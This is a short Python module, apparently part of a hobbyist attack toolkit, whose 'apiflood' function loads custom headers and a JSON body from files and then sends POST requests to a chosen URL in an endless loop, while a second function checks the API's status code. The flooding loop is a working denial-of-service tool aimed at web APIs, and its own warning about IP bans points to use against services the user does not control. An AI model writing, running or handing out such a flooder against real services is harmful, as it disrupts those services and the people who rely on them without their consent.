import requests
from json import load
from src.design.colors import RED, GREEN, PURPLE, WHITE
import time

def apiflood(url):
    print(f"{RED}[!]{WHITE} This function might result in an API ban on your IP address if the API is moderated or has a good rate limit.")
    time.sleep(1)
    print(f"{GREEN}[+]{WHITE} Loading headers and json...")

    try:
        jsonfile = open("src\\dependencies\\json.json")
        headersfile = open("src\\dependencies\\headers.json")
        json_data = load(jsonfile)
        headers = load(headersfile)
    except Exception as e:
        print(f"{RED}[!]{WHITE} dependencies are empty, fill them up.")
        return

    time.sleep(1)

    if not headers:
        print(f"{RED}[!]{WHITE} No headers found, fill the file in dependencies and retry")
        return
    elif not json_data:
        print(f"{RED}[!]{WHITE} No JSON found, fill the file in dependencies and retry")
        return
    else:
        print(f"{PURPLE}[+]{WHITE} Press any key to continue with the following headers and JSON\nheaders = {headers}\nJSON = {json_data}")

    i = 0

    try:
        while True:
            r = requests.post(url, json=json_data, headers=headers)
            print(f"{PURPLE}[+]{WHITE} Post: {i}, code: {r.status_code}", end="\r")
            i = i+1
    except Exception as e:
        print(f"\n{RED}[!]{WHITE} An error occurred: {e}")

def checkapi(url):
    print(f"{GREEN}[+]{WHITE} Checking the api response code from your ip...")
    time.sleep(1)
    r = requests.post(url)
    print(f"{PURPLE}[+]{WHITE} Success, loading results: \nStatus: {r.status_code} \nRaw: {r.raw}")

# apiflood("https://")
# checkapi("https://")